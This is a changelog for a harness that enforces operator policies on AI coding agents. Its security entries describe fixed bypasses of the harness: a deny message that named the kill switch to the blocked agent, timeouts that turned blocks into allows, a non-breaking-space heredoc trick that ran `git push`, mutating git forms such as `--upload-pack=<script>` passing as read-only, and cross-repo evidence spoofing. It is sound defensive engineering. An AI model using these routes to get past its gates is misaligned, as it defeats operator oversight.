# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Security

- **SECURITY: the agent-facing deny envelope of the built-in `gate-prod-destructive`
  Risk Gate policy named the session-wide kill switch (`harness pause --for
  <duration>` / `harness resume`) as a way to unblock a denied critical
  production mutation** (task `70781cf6`). `ux.run` is the exact "what to do
  next" text the blocked agent reads (`renderAgentFacing`,
  `src/runtime/intercept.ts`); handing that same agent a recipe for silencing
  every gate in the session is a full bypass instruction addressed to the
  party who was just blocked, not to the operator who alone can act on it.
  Removed the kill-switch line from `gate-prod-destructive`'s `ux.run` in both
  `src/cli/init/templates.ts` (`FULL_TEMPLATE`) and
  `docs/examples/full-manifest.yaml`; the two remaining `run:` entries (choose
  a non-destructive alternative, or ask the operator for a deliberate `harness
  approve risk --force` override) stay unchanged and fully actionable. The
  operator-facing recovery path is not lost: `harness pause`'s own refusal
  message already explains the correct route (a terminal genuinely outside the
  agent session). While auditing every other shipped `ux.run` line for the
  same class of leak, the `deny-kill-switch-bypass` and
  `deny-pause-sentinel-forgery` policies' `run:` text also named `pause`/
  `resume` as something the operator could be asked to do; reworded both to
  point back at the commands already named in their `cannot`/`required` text
  instead of repeating the verbs in the actionable `run:` list.
  `deny-session-env-strip`'s `run:` line did not name either verb and is
  unchanged. New/updated tests: `tests/cli/init-no-agent-facing-pause-hint.test.ts`
  is a new repo-wide guard that walks every `ux.run` line across
  `FULL_TEMPLATE`, `SOLO_TEMPLATE`, `TEAM_TEMPLATE`, and
  `docs/examples/full-manifest.yaml`, failing if any shipped agent-facing
  `run:` entry names `pause`/`resume` as a course of action (a "see also"
  citation to `docs/okf/pause-vs-gate-kill-switch.md` is allow-listed as
  non-actionable), plus a dedicated assertion that `gate-prod-destructive`'s
  `ux.run` has exactly its two legitimate entries left; regenerated
  `docs/examples/full-manifest.expected.yaml` (the `harness describe` golden
  fixture) to match; the existing `tests/cli/init-full-template-parity.test.ts`
  / `tests/cli/init-templates-ux-parity.test.ts` deep-equality checks between
  `FULL_TEMPLATE` and `docs/examples/full-manifest.yaml` confirm the two
  sources stayed in lockstep.

- **SECURITY: `harness apply`'s generated Claude Code `settings.json` hook
  `timeout` was emitted in the manifest's `budget_ms` unit unconverted, so
  every Claude-hook kill-timer was 1000x too large** (task `7bf47554`).
  Claude Code's settings.json hook `timeout` is documented in SECONDS
  ("Seconds before canceling",
  https://code.claude.com/docs/en/hooks); the manifest's `budget_ms` is
  milliseconds. `toSettingsCommand` (`src/cli/apply/generate-settings.ts`)
  emitted `timeout: h.budget_ms` with no unit conversion, so a template
  budget of 1000-2000ms silently became a Claude Code timeout of
  1000-2000 SECONDS (16-33 minutes) instead of 1-2 seconds, meaning
  hard-blocking enforcement hooks (e.g. `harness policy intercept`) could
  hang for tens of minutes before Claude Code cancelled them, rather than
  failing fast. The sibling Codex projection
  (`src/cli/apply/generate-codex-config.ts`) already converted correctly
  (`Math.ceil(budget_ms / 1000)` with a policy-intercept floor); the
  Claude Code projection now shares that exact formula via a single
  extracted helper, `hookTimeoutSeconds` (`generate-settings.ts`), so the
  two runtime projections cannot diverge on this again. `harness adopt`'s
  reverse projection (`src/cli/adopt/index.ts`'s `buildHookEntry`), which
  read a live settings.json `timeout` back into the manifest's
  `budget_ms`, is fixed symmetrically (`* 1000`) so the adopt<->apply
  round-trip stays lossless; `timeout` remains deliberately excluded from
  the adopt drift key, so the ms/seconds rounding asymmetry a non-1000-
  multiple `budget_ms` introduces (e.g. 1500ms -> 2s -> 2000ms) does not
  register as phantom drift or duplicate-adopt a hook. New/updated tests:
  `tests/cli/apply/generate-settings.test.ts` pins the corrected
  conversion (including the 2s/1s floors) and asserts both runtime
  projections emit the identical seconds value for the same hook;
  `tests/cli/adopt.test.ts` adds an explicit apply-then-adopt round-trip
  test for the 1500ms rounding-asymmetry case, asserting zero drift.

  **Fix round 2, same task: the corrected 1-2s outer timeout above was
  ITSELF a fail-open regression, not purely a safety fix.** Review found
  that `harness policy intercept`'s blocking, ledger-consulting hooks —
  every `requires:`-based policy (the require-*-evidence / risk-gate
  policies) AND, via the engine's unconditional per-decision audit write
  (`intercept()`'s `options.ledger.record(...)` call, run for every
  matched policy including the pure pattern-deny `operator_only` kill
  switches), every other blocking `harness policy intercept` hook too —
  can legitimately need up to the grounding-mcp server's own
  `health.timeout_ms` (5000ms by default) for a single ledger query, plus
  a further deny-degraded audit-write retry bounded by
  `auditRetryTimeoutMs` (`src/cli/policy/intercept.ts`), for a measured
  worst case of ~10.8-13.75s. The now-CORRECT 1-2s Claude Code outer
  timeout sits well UNDER that: on a merely slow or hung ledger (not a
  clean, fast failure), Claude Code kills the `harness policy intercept`
  subprocess before its `deny`/`deny-degraded` JSON reaches stdout, and a
  killed PreToolUse hook is treated as ALLOW — silently turning a
  correctly-computed fail-closed verdict into an unintended fail-open one.
  The same shape applies to the three builtin policy-pack blockers
  (`branch-protection`, `understanding-before-execution`,
  `post-merge-gate`), whose own ledger probes are bounded by the identical
  `health.timeout_ms` with effectively zero margin against their own
  budget_ms=5000 outer timeout. Fixed by raising every blocking (`blocking:
  "hard"`), ledger-consulting hook's `budget_ms` to 15000 (a 15s outer
  timeout) in `src/cli/init/templates.ts` (FULL_TEMPLATE's eleven
  `harness policy intercept` hooks, uniformly — deliberately including the
  three pattern-deny kill-switch hooks, both because their audit write
  waits on the same ledger round-trip and because `generate-settings.ts`'s
  `buildGroups` dedupes same-matcher hooks by `(command, timeout)`, so a
  non-uniform budget would split one Claude Code invocation per Bash call
  into several redundant ones), `docs/examples/full-manifest.yaml` /
  `.expected.yaml` (the one hook there that actually routes through
  `harness policy intercept`), and the three builtin policy packs
  (`src/policy-packs/builtin/branch-protection.ts`,
  `understanding-before-execution.ts` — both the Claude and Codex
  variants — `post-merge-gate.ts`). 15000ms clears the measured
  ~10.8-13.75s worst case with margin. Trade-off, stated plainly: a gated
  action can now visibly freeze for up to ~15s when the evidence ledger is
  down or hanging, instead of failing fast (and silently open) at 1-2s —
  this IS the intended fail-closed posture the Risk Gate's
  `degraded_fail_posture: preserve_enforcement` default (task `f1aea826`)
  already commits to; the pre-existing 1-2s budget just never gave that
  posture enough time to actually land. New test:
  `tests/runtime/hook-budget-ledger-margin.test.ts` pins, against the real
  shipped `FULL_TEMPLATE` and the real policy-pack `resolve()` output
  (not a hardcoded hook-name list), that every blocking ledger-consulting
  hook's outer timeout clears `health.timeout_ms` plus the deny-degraded
  audit-retry margin — a lightweight stand-in for the fuller drift-guard
  task `d20a7e0c` is tracking.

  **Fix round 2 continued, same task: the raise above was itself
  incomplete.** Review found two more `harness init` surfaces still
  shipping the identical blocking `harness policy intercept` hooks at
  their pre-fix 1000-2000ms budgets — the same fail-open gap, reachable
  through a different init path than `--template full`: the
  `harness init --interactive` Custom composer's `HOOK_FOR_POLICY` table
  (`src/cli/init/composer.ts`, five hook rows backing its six reference
  policies) and the `team` profile template's `require-review-evidence`
  hook (`src/cli/init/profiles.ts`'s `TEAM_TEMPLATE`). Raised both to the
  same uniform 15000ms. The `solo` profile template ships no blocking
  `harness policy intercept` hook at all (no agent-tasks-coupled or
  Bash-triggered evidence policy in that profile), so there is nothing to
  raise there; a new negative-control test pins that this is by design,
  not an oversight. With this, the "every blocking ledger-consulting
  hook" framing above is now accurate across every manifest-emitting
  `harness init` surface, not only `FULL_TEMPLATE`. Also strengthened
  `tests/runtime/hook-budget-ledger-margin.test.ts`: it now asserts the
  same margin invariant against the Custom composer's full policy
  selection and `TEAM_TEMPLATE` too (mutation-probe confirmed: reverting
  either surface's budget back to its pre-fix value turns exactly that
  surface's new assertion red, while every other assertion — including
  the other surface's — stays green), asserts the `SOLO_TEMPLATE`
  negative control, and adds a hard 15000ms floor assertion alongside the
  existing formula-derived margin check. The formula alone
  (`health.timeout_ms` + 2x `auditRetryTimeoutMs`, ~8s for the shipped
  5000ms grounding-mcp timeout) understates the measured ~10.8-13.75s
  subprocess wall-time worst case, so a partial regression into
  [8000ms, 13000ms) would still pass a formula-only check; the new hard
  floor (pinned to the same ~10.8-13.75s measurement this task's budget
  note above and `src/cli/init/templates.ts` both cite) closes that gap,
  with its own control test pinning the discrimination at a 10000ms
  probe value.

- **SECURITY: the operator-approval escape matcher (`isEscapeCommand`,
  `src/cli/pack/approve-escape.ts`) used JS's generic `\s` whitespace
  class where bash's actual lexical blank set was meant, letting a
  non-bash-blank codepoint move a report heredoc's real delimiter word
  (as bash reads it) away from the word the matcher extracts** (task
  `623640a5`). Ground-truthed against GNU bash with a PATH-stub harness:
  of the 25 codepoints JS's `\s` class matches, only TAB and SPACE are
  bash lexical blanks; the other 23 (NBSP U+00A0, LF, CR, VT, FF, and 18
  further Unicode space-separator/line-separator/BOM codepoints) glue
  onto the adjacent token instead of being stripped as an insignificant
  separator. Measured exploit shape (the 2026-08-04 halt that opened this
  task): a non-breaking space right after a report heredoc's `<<'X'`
  intro closing quote was accepted by the matcher's `\s*$` as
  insignificant trailing whitespace, so the matcher extracted delimiter
  `X`; bash instead glues the NBSP onto the quoted word, so its real
  delimiter is `X`+NBSP, and the body line `X`+NBSP (matching the
  matcher's delimiter, not bash's) closes the heredoc one line early:
  the following body line then runs as a real top-level command
  (`git push origin master` in the measured repro) instead of staying
  inert report text. Fix: every regex in the module that means "a
  separator bash will actually treat as blank here" (the heredoc-intro
  trailing/leading whitespace, the `harness`/`approve` separator, the
  heredoc command-part whitelist, the command-part right-trim, and the
  post-terminator blank-line check) now uses `[ \t]`, never `\s`.
  Behavior change operators should know about: a `harness approve`
  heredoc carrying a non-bash-blank codepoint in one of those positions
  used to be accepted as a clean escape and routed to the normal
  interactive ASK permission prompt; it is now DENIED outright (fails
  closed to the ordinary understanding-gate block), since ASK implied a
  false equivalence to the safe heredoc shape. The PreToolUse
  discoverability hint (`approveEscapeHint`,
  `src/cli/pack/hook-pre-tool-use.ts`) now also names the offending
  codepoint (e.g. "contains U+00A0 ... where an ordinary space or tab was
  expected") when a blocked command carries one, so an agent that emitted
  invisible whitespace gets a reason instead of silently retrying the
  same bytes. New regression tests: `tests/cli/pack-approve-escape.test.ts`
  (the full 25/23 codepoint enumeration measured against the live JS `\s`
  class, the NBSP incident itself, and a mechanical guard, module source
  with comments/strings stripped, asserting no future regex in the
  module can reintroduce a bare `\s` token, mutation-verified to actually
  redden); `tests/cli/pack-hook-pre-tool-use.test.ts` (the hint still
  surfaces for the newly-blocked shapes, now naming the codepoint; a
  negative control confirms an ordinary metacharacter block names no
  codepoint).

- **SECURITY: `harness doctor` now detects template-policy drift, an
  installed manifest that lacks a shipped `operator_only` kill-switch
  security policy** (task `adf037c1`). Measured 2026-08-06: a 0.44.0
  machine whose `~/.harness/harness.yaml` predated the kill-switch
  defenses (`deny-kill-switch-bypass`, `deny-session-env-strip`,
  `deny-pause-sentinel-forgery`) had the documented `harness pause`
  bypass live as ALLOW, with nothing surfacing the gap: `harness apply`
  never retroactively adds newly-shipped default policies to an
  already-materialized manifest, so security policies introduced after
  install reach only fresh installs. Doctor's new "Template drift
  (shipped security policies)" section compares the installed manifest
  against `shippedOperatorOnlyPolicyNames()` (the `operator_only` set
  parsed from `FULL_TEMPLATE` itself, kept honest by the full-template
  parity test), so it can never drift from what `harness init --template
  full` writes and automatically extends when a new operator_only policy
  is added. Each missing policy is an ERROR (doctor exits non-zero, the
  standard CI/dogfood signal), naming the policy and the rehydration
  path. A same-named-but-DOWNGRADED policy (present but no longer
  `operator_only: true`, e.g. the historical `requires.ledger_tag` shape
  a ledger write can satisfy, or `enforcement: warn`) is flagged as a
  distinct error too: name-presence alone would pass a bypassable
  kill-switch as no-drift, the exact aged-manifest class this check
  targets. A stale/typo'd `doctor.ignore_template_drift` entry matching
  no shipped name is surfaced as a warning so a policy rename cannot
  silently strand an opt-out. Scope is the `operator_only` security floor regardless of profile
  (a solo/team install missing kill-switch protection is flagged too;
  that is the security core, per operator decision 2026-08-08), and it
  does NOT nag about full-only convenience policies a smaller profile
  never carried. Deliberate opt-out: `doctor.ignore_template_drift:
  [<policy-name>, ...]` in the manifest, a NEW minimal `doctor:` schema
  section that silences only the doctor report line and changes no
  enforcement. This is deliberately NOT a `policies[].enabled: false`
  flag: the runtime policy engine has no such concept, so an operator
  setting it would believe a policy disabled while it still fired (a
  footgun the CLI help + docs already implied but no code backed). The
  original AC's two-severity split (operator_only error vs cosmetic
  warning) was consciously narrowed to a single operator_only error tier
  per the same operator scope decision, since cosmetic policies are no
  longer compared. Shared `checkTemplatePolicyDrift` in
  `src/cli/validate/checks.ts` (doctor-only surface today; validate is
  about internal consistency, not external-reference comparison, so it is
  intentionally not wired to fail `harness validate`/`apply`).
  docs/okf/pause-vs-gate-kill-switch.md documents the drift check and the
  opt-out; fixtures cover missing/present/opt-out/partial, and a parity
  test pins the shipped set so a template rename reddens rather than
  silently shrinking the check.

- **SECURITY: read-only Bash classifier no longer treats mutating
  argument forms of allowlisted git subcommands as read-only** (task
  `9d1fff1b`). `GIT_READ_ONLY_SUBS` (`src/runtime/read-only-bash.ts`)
  was a bare-form allowlist of subcommand NAMES; measured against real
  git 2.50.1, six argument forms of those names mutate while classifying
  read-only: `git branch -D <b>` (deletes a branch), `git tag <name>`
  (creates a tag), `git remote set-url` (rewrites config), `git fetch
  <url> <refspec>` (writes an arbitrary local ref), `git diff
  --output=<path>` (creates/overwrites a file; `log`/`show` accept the
  same option), and `git reflog expire`/`delete` (destroys reflog
  entries). All four consumers of the classifier — the risk-classifier
  read-only severity floor, both PreToolUse understanding-gate hooks, and
  the solution-acceptance write-guard — funnel through the same
  `classifyTokens`, so all four are corrected by the single fix and none
  needed a consumer-side change (measured: the full pack + risk-classifier
  suites, 602 tests, unchanged). The `bin === "git"` branch now applies a
  per-subcommand POSITIVE argument-form check (`isReadOnlyGitInvocation`):
  branch/tag are read-only only with no non-flag operand (every mutation
  needs the branch/tag name; branch also denies the glued no-operand
  writes like `--set-upstream-to=`); remote only for the `show`/`get-url`
  verbs or bare `-v`; fetch only for bare or a single remote/URL (a
  second positional refspec blocks — the escalation to an arbitrary
  local ref); reflog only for bare/`show`/flag forms (expire/delete/drop
  are always the first arg); everything after a bare `--` is folded into
  the positional view. Two write/exec vectors reach git's SHARED option
  parser and transport layer and are therefore forfeited GLOBALLY, above
  the per-subcommand switch, for every allowlisted git subcommand (review
  round 1, measured against git 2.50.1): `--output=<path>` creates a file
  at option-parse time — measured writing on `rev-list`/`shortlog`/`blame`
  as well as diff/log/show — and `--upload-pack=`/`--exec=`/`--receive-pack=`
  plus `ext::`/`fd::` positional transports run an operator-named binary
  locally (measured `git fetch --upload-pack=<script> <repo>` executing
  the script). The choice is positive-shape, not a write-flag
  denylist, so a git argument this floor has not reasoned about
  over-blocks (annoying) instead of laundering a write (unsafe) — the
  same fail-closed stance as the existing `npm audit` guard, and
  deliberately NOT the enumerate-every-exception shape whose repeated
  failure halted the neighbouring task 5b5d1022. Literal verb/flag
  comparisons use the repo's raw-or-decoded form (task fdee7d0f) so a
  quoted spelling (`git remote se"t-url"`) fails the positive match and
  blocks rather than slipping through. Explicitly out of scope (separate
  tasks): global-option / path-qualified git (`git -C <d>`, 5b5d1022),
  GNU long-option abbreviations (dd055c1d), and env-var exec equivalents.
  negative tests pin the mutating forms (reproduced against git 2.50.1),
  positive controls pin the bare forms plus the read corpus (`rev-parse
  --git-dir`, `ls-files -c`, `log -c HEAD`, `show -c HEAD`, `diff --stat`,
  `status --short`, and single-positional `fetch`/`ls-remote` from a URL);
  a mutation probe confirms reverting to the bare-name allowlist reddens
  the negative suite, and a per-arm probe confirms each raw-or-decoded
  decode arm is load-bearing (deleting it reddens a quoted no-positional
  write form). The over-blocked read forms (`git tag -l 'v*'`,
  `git branch --contains HEAD`, separated fetch flag values, ...) are the
  accepted conservative cost, documented in `docs/risk-gate.md`.

- **SECURITY: block/require_approval policies now fail CLOSED when their
  evidence source is degraded, instead of silently mapping to the
  never-blocking `warn-degraded`** (task `f1aea826`). Measured 2026-08-06 on
  0.44.0 (isolated probe home, `git push` event without its preflight tag):
  a healthy ledger denied, every broken-ledger shape (ENOTDIR, corrupt file,
  directory) denied, but `--ledger-timeout` at 1/25/50/100 ms flipped the
  same event to **ALLOW**, because the timeout path mapped to
  `warn-degraded`, which `isBlockingDecision` never treats as blocking.
  `evaluateOnePolicy`'s degraded family (ledger timeout/spawn failure,
  unresolved template variables, invalid `within`, thrown evaluator,
  schema-invariant branch) now routes through a tier-aware
  `degradedOutcome`: `warn` policies keep the non-blocking `warn-degraded`
  (availability first, unchanged), `block`/`require_approval` policies
  produce the NEW blocking `deny-degraded` outcome. The `deny-degraded`
  envelope deliberately bypasses the policy's `ux:` surface and names the
  degraded cause (sanitised: the transport reason embeds subprocess
  output, so the envelope interpolation is bounded to 200 chars with
  control characters stripped) plus an operator-facing recovery path, so
  nobody debugs a phantom missing tag on an unreadable ledger. The
  fail_open opt-out is deliberately ABSENT from that agent-facing text
  (review finding: a deny that includes its own disable recipe is not a
  gate, and nothing prevents the blocked agent from editing the
  manifest); it is named on the operator surfaces instead: the verbose
  stderr diagnostic, docs/risk-gate.md, and the OKF fail-posture matrix.
  **ACCEPTED SEMANTIC CHANGE
  an upgrading operator should know about:** a degraded ledger (including
  "grounding-mcp not declared in manifest" under block-tier policies) now
  DENIES where it silently allowed; the explicit manifest opt-out
  `risk.degraded_fail_posture: fail_open` (schema default
  `preserve_enforcement`, `src/schema/risk.ts`) restores the pre-0.45
  availability-first mapping for every tier, and the operator-only
  `harness pause` kill switch remains the deadlock escape (it is honoured
  BEFORE manifest load); the shipped init template documents the knob as
  a COMMENTED-OUT line on purpose (the schema is strict, so an emitted
  key would make the manifest unreadable by a pre-0.45 binary, and a
  manifest load failure is allow at the hook layer: on a mixed-version
  fleet that would turn a downgrade into a silent full fail-open). Audit
  completeness rides along, best-effort and precisely bounded: the pooled
  ledger session's timeout latch previously guaranteed that exactly the
  degraded deny lost its own audit row (every post-timeout call on that
  session short-circuits), so `realLedgerClient.record` now retries once
  per invocation over a fresh session, RESERVED for `deny-degraded` rows
  (an allow/warn row failing first cannot consume it) and capped at
  max(250ms, timeoutMs/4) per call — two calls, so the added stall is at
  most half a timeout once the ledger timeout is >=1s, and bounded at
  500ms absolute below that, where the floor dominates (the formula is
  pinned as the exported `auditRetryTimeoutMs`); a longer or unreserved
  retry would stall the deny path toward the outer hook budget, where a
  hook timeout is conventionally allow. With grounding-mcp absent from the manifest
  altogether there is no transport at all: a BLOCKING decision on that
  path now emits a dedicated "has NO audit row" stderr line instead of
  the previous silent no-op. `isBlockingDecision` is now exported and
  shared with the CLI wrapper's pending-approval staging, which had a
  drifted hand-rolled copy. New outcome threaded through every consumer:
  `harness audit` `VALID_OUTCOMES`, `explain`/`audit` `--outcome` filters,
  the verbose stderr diagnostic (which names the outcome, the fail-closed
  posture and the operator opt-out, cause-neutrally — the true cause
  follows on its own reason line), a NEW
  default-verbosity one-line stderr operator hint per degraded-denied
  event (carrying the decision's OWN sanitised reason, since
  deny-degraded has five causes and only one of them is the ledger — a
  hardcoded ledger-fault wording sent operators of the other four to a
  green `harness doctor`; pointing at doctor and the docs, deliberately
  without the opt-out literal on the default channel, and suppressed
  under verbose where the full diagnostic supersedes it), and the
  `checkPolicyGroundingMcp` validate/apply warning, whose pre-0.45
  "every policy will fire in degraded warn-mode" wording described the
  inverse of the new block-tier behaviour and is now tier-aware and
  test-pinned; `smoke` assertions classify the new outcome as deny via
  the unchanged envelope path. A stale-contract drift guard now runs in
  the suite: `tests/no-stale-fail-posture-claims.test.ts` fails if the
  pre-0.45 phrasings OR the round-4-enumerated restatement shapes
  ("ledger degradation → warn-degraded" untiered, "only ever blocks if
  grounding-mcp", the untiered fail-open framing) reappear under `src/`
  or `docs/` outside a per-phrase allowlist with freshness checks and
  one positive control per needle. Honest bound, stated in the guard
  itself: it is a literal/pattern grep pinning the mechanically
  greppable phrasings the review rounds found, not a semantic checker —
  wrong-modality claims were fixed by hand and are not pinned, and a
  future paraphrase avoiding all needles still needs eyes (four review rounds
  each found a fresh such surface; docs quoting message literals
  verbatim was the recurring root cause, so the updated docs now
  describe messages instead of quoting them); the same sweep updated
  docs/writing-custom-policies.md,
  docs/CLI.md, docs/examples/pandora-bootstrap.md, the OKF
  producer-wiring bundle, the ledger-client module header, the init
  composer's wizard advisory, and marked the superseded ROADMAP Phase 4
  acceptance bullets. NOT closed here, named so no
  doc overclaims: the OUTER hook-budget layer (a hook exceeding its
  `budget_ms` is allow by harness contract) stays fail-open and is not
  reachable from this repo's schema; keep hook budgets comfortably above
  the ledger timeout (the shipped template's 1000-2000ms budgets vs the
  5000ms grounding-mcp health timeout mean the HANG shape can still blow
  the hook budget before the deny lands; a validate/doctor consistency
  check is filed as a follow-up task), and malformed event JSON or a
  failed manifest load remain allow-with-stderr at the CLI wrapper.
  docs/risk-gate.md "Degraded mode",
  docs/okf/gate-fail-posture-matrix.md,
  docs/okf/policy-engine-producer-wiring.md and
  docs/okf/debug-verb-selection.md rewritten to the new contract;
  the two pre-0.45 pins asserting warn-degraded-never-blocks for block
  tier were rewritten deliberately alongside (unit + e2e), plus new
  fixtures: require_approval+timeout blocks, warn+timeout allows,
  fail_open opt-out restores the old mapping end-to-end through the real
  manifest parse, genuine-timeout e2e (hanging fake grounding-mcp), an
  AC4 e2e pinning exactly TWO subprocess spawns with the `deny-degraded`
  row landed in the ledger despite the latch, retry allocation (a warn
  row failing first does not consume the deny row's retry),
  envelope-over-ux precedence, envelope sanitisation, the opt-out's
  absence from the envelope and presence on stderr, the no-transport
  "has NO audit row" line, and `--outcome deny-degraded` accepted by
  audit/explain filters.

- nanoid bumped 3.3.16 → 3.3.18 via `npm audit fix` (lockfile-only, no source
  change), closing GHSA-2v37-7h3g-55p8 / CVE-2026-67213 (High, CVSS 8.2:
  `customAlphabet`/`customRandom` loop indefinitely when `size` is 0; affected
  range < 3.3.17). Dev-only transitive (vitest → vite → postcss → nanoid);
  postcss's declared `^3.3.16` already admits the fix, so no `package.json`
  change and no override introduced (the same shape as the 0.42.0 entry that
  carried nanoid 3.3.12 → 3.3.16 for the postcss advisory). harness source
  never calls nanoid, so the advisory's mechanism is not reachable from the
  shipped CLI; the practical effect is `npm audit` back to 0 findings and this
  repo's own preflight npm-audit check unblocked. Note the structural residue
  the 0.42.0 entry already accepted: postcss's range floor (3.3.16) is below
  the patched 3.3.17, so only the lockfile pin holds the fix (conscious
  no-override decision, unchanged). (task `b81e8e09`)

### Added

- The `toolchain-parity` ledger fact now carries unparseable peer snapshots
  instead of silently absorbing them into a shrunken comparison (task
  `690fba7c`, consumer hardening motivated by the agent-memory `06d09cde`
  incident where a corrupted `machine-state/<profile>.json` — inline git
  conflict markers, not valid JSON — made the drift count quietly fall from
  `drift:22` to `drift:5` with no warning). A peer file that fails
  `parseSnapshotJson` now also logs a `parity:unparseable-peer:<file-derived
  label>` stderr line, and the run's ledger fact gains a
  `:unparseable-peer:<n>` suffix (e.g. `toolchain-parity:drift:7:unparseable-peer:2`)
  whenever one or more peer files were skipped this way, so an unparseable
  peer never makes `drift:N` look like a complete comparison. (Peers whose
  file cannot be READ at all are a separate branch scoped to task
  `c1b5ade5`; the absence of the suffix alone therefore does not prove
  completeness.) The file-derived label is sanitized before interpolation —
  peer filenames arrive cross-machine via sync and are untrusted, so a
  crafted name cannot forge a standalone parity line in stderr — and falls
  back to the raw filename when stripping `.json` would leave it empty. The
  existing "peer snapshot `<file>` is corrupt" warn line is unchanged;
  valid-only peer sets keep the exact pre-existing `toolchain-parity:ok` /
  `toolchain-parity:drift:<n>` format (no behaviour change). Four new tests
  (negative control, corrupt-peer-plus-drift, multi-peer aggregation
  pinning `:unparseable-peer:2`, hostile-filename sanitization) plus two
  existing cases extended.
- Both PreToolUse hooks (Claude and Codex) now tell a blocked agent WHICH
  Understanding Report sections were malformed on their last attempt: a
  `(list)` heading that was present but held prose instead of markdown
  list items, with an agent-facing sentence naming each section as
  `<Display Name> (<key>)` (e.g. `Prior Art (priorArt)`), paired with
  `renderReportSchemaHint`'s existing display-name vocabulary rather than
  the bare camelCase key the parser itself uses (task `823837fd`, review
  Fix 3). The sentence is only appended when the session has NO persisted
  report at all, never when a fixed report is merely pending operator
  approval (review Fix 1), and is defined once and shared by both hooks
  via `renderMalformedSectionsNotice` (`src/cli/approve/understanding.ts`,
  review Fix 4) instead of two byte-identical copies.
- `harness approve understanding`'s one-line parse-error summary
  (`findLatestParseError`) likewise names malformed sections when the
  operator-facing reason is not already sourced from the package's own
  `message` field, which annotates them inline since
  `@lannguyensi/understanding-gate` 0.4.10 (review Fix 5).
- `@lannguyensi/understanding-gate` lockfile refreshed to 0.4.10 (the
  `malformedSections` `ParseError` field this surfacing depends on);
  the declared range stays `^0.4.9`.

## [0.44.0] - 2026-08-03

### Security

- **SECURITY: `${REPO}`/`${BRANCH}`/`at_head` now resolve PER POLICY to the repository a gated command actually touches, closing the cross-repo defect where a preflight fact recorded for repository A authorised an investigative git read (or, chained, a mutation) of a DIFFERENT repository B** (task `98ad072f`). Measured and closed: `preflight-before-investigation`'s cwd-only resolution (unchanged since 0.42.0, explicitly named as future work — follow-up `98ad072f` — in the 0.43.0 entry below) let `git -C <B> status` from cwd A be authorised by A's own `preflight:${REPO}` fact even though the read genuinely runs against B; `preflight-before-push` had the mirror gap for `${BRANCH}`/`at_head`. `src/runtime/command-normalize.ts` gains a per-segment view (`segmentViewOf`/`CommandSegment`: own explicit target + composed effective target); `src/runtime/intercept.ts`'s `resolveAttributedContexts` uses it to evaluate a `${REPO}`/`${BRANCH}`-bearing policy once per DISTINCT repository context a trigger-satisfying segment names, not once per event.

  **ACCEPTED SEMANTIC CHANGE (operator decision D-021, after a four-pass halt — see below):** attribution is UNIVERSAL-ADDITIVE, never a replacement. The cwd context is demanded UNCONDITIONALLY on every event a per-repo-builtins policy matches; each distinct attributed target (a segment's own `-C`/`env -C`/`--git-dir`, or a target inherited from a preceding `cd`) ADDS its own demand alongside cwd's, never in place of it. Concretely: **`git -C <B> push` from cwd A now demands BOTH A's and B's preflight evidence — holding only B's tag no longer authorises reading or mutating B from a different cwd.** This is more restrictive than the shipped, cwd-only engine (never weaker, by construction — see the matrix below), but it is a real behaviour change an operator upgrading should know about: a workflow that legitimately does `git -C <B> ...` from a different repository's checkout now needs a preflight recorded in EACH repository it touches, not just its own cwd.

  **Why additive, not "attribute to the segment's own target and stop" (the design this task shipped and then reverted four times):** an own-target REPLACE design — trust a segment's own `-C`/`--git-dir` as proof the invocation runs there, and evaluate ONLY that context — was built, reviewed, and found to reopen the exact class of bug this task exists to close, four separate times across four independent adversarial review passes, each measured against the real shipped binary and (where relevant) real git: (1) an inherited `cd` basis carried into a segment bash does not actually run in (a subshell close, a bare pipe stage, `cd -`, `pushd`) let a forged `.git/HEAD` directory redirect the tag; (2) `--work-tree=<B>` was folded into the same own-target bucket as `-C`/`--git-dir` though it does not relocate the git-dir, so `git --work-tree=<B> push` still runs in the CWD repo but was attributed to B; (3) more than one repo-relocating option (`git -C <forge> -C <realA> push`) was attributed to the FIRST one seen while real git composes cumulatively and runs in the LAST; (4) a tilde-valued second `-C` (`git -C <decoy> -C ~/sub push`) was invisible to (3)'s own ambiguity counter, so the ambiguity lock never engaged. Each was fixed individually and confirmed sound by every later pass; the RECURRENCE — four distinct instances of one class — is what this repo's structural-regression-halt convention exists to catch, and the fourth instance triggered exactly that halt (nothing merged at that point; the operator was handed the full four-pass history rather than a fifth "surely now complete" patch). The chosen fix makes the property true BY CONSTRUCTION instead of by enumerating git's composition knobs: since the cwd demand is never dropped, no gap in the static, string-only shell/git model — known or not yet found — can make a gate weaker than the shipped cwd-only engine. `03-decisions.md` D-011/D-017/D-018/D-019/D-020/D-021 in `.ai/runs/2026-08-02-per-repo-gate-scoping-redesign/` carries the full per-pass history.

  **Measured, not asserted, that this holds:** `scripts/measure-additive-attribution-matrix.mjs` (`npm run measure:additive-attribution-matrix -- --control <dir containing an installed 0.43.0 build>`) runs a differential matrix of 6 separators (`&&`, `;`, newline, `|`, `||`, subshell) x 8 command forms (spanning every one of the four historical bypass classes above, plus a legitimate single-`-C` case and two no-target baselines) = 48 cells, each with a ledger holding ONLY a forged/decoy repository's evidence (the cwd's own is always absent), run against BOTH this engine and the real, installed 0.43.0 binary as the shipped oracle. Result: **0/48 cells weaker than 0.43.0** — every cell's cwd-tagged decision is identical to what 0.43.0 itself computes for that same command, and 21/48 cells additionally exercise the additive branch (a genuine second, foreign context demanded alongside cwd's). The instrument's own self-test sabotages those 21 cells to pre-fix REPLACE semantics post-hoc and confirms the audit catches all 21/21 — proof the "0 weaker" result is a real measurement, not a referee that cannot fail.

  **The bound (D-013):** distinct attributed contexts for one policy on one event are capped at 4 (`MAX_ATTRIBUTED_CONTEXTS`); a command naming more fails CLOSED — one synthetic decision naming the ambiguity, ZERO ledger queries for that policy — respecting the policy's own `enforcement:` (a `block` policy denies, a `warn` policy warns, never a hardcoded outcome), rather than silently evaluating all of them (the measured amplification this bound closes: K distinct targets against N per-repo policies previously cost N×K ledger queries and audit writes per event, unbounded).

  **What this does NOT close, verbatim, so no doc or commit overclaims it:**
  - A same-invocation composition this module cannot resolve to a single, unambiguous target (more than one repo-relocating option, or `--work-tree` alone) still falls back to cwd-only — precisely the shipped 0.43.0 behaviour for that shape, not a new gap. D-017/D-018 stay in place as PRECISION (avoiding a spurious extra demand), no longer as the security mechanism — D-021's additive backstop is what carries safety now.
